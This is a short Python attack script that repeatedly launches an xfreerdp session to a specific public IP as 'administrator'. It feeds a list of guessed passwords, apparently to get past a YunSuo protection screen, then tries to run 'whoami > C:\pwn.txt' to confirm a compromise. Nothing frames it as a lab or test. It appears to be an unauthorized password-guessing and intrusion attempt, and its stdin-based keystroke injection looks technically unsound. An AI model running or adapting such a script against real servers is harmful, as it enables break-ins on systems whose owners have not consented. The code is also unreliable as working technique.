import subprocess, time, os

# 启动xfreerdp全桌面模式
env = os.environ.copy()
env["DISPLAY"] = ":99"

passwords = ["silverplus", "silverplus123", "silverplus888", "yunsuo", 
             "admin", "admin123", "silver", "123456", "passsword"]

for pw in passwords:
    print(f"Trying: {pw}")
    proc = subprocess.Popen(
        ["xfreerdp", "/v:113.113.81.253", "/u:administrator", "/p:100206",
         "/cert-ignore", "+sec-nla", "/size:800x600"],
        stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(8)  # Wait for YunSuo screen
    # Send password + Enter
    try:
        proc.stdin.write((pw + "\n").encode())
        proc.stdin.flush()
        time.sleep(5)
        # Send whoami to test if we got through
        proc.stdin.write(b"cmd\n")
        time.sleep(2)
        proc.stdin.write(b"whoami > C:\pwn.txt\n")
        time.sleep(3)
    except:
        pass
    proc.terminate()
    time.sleep(1)

print("Done")
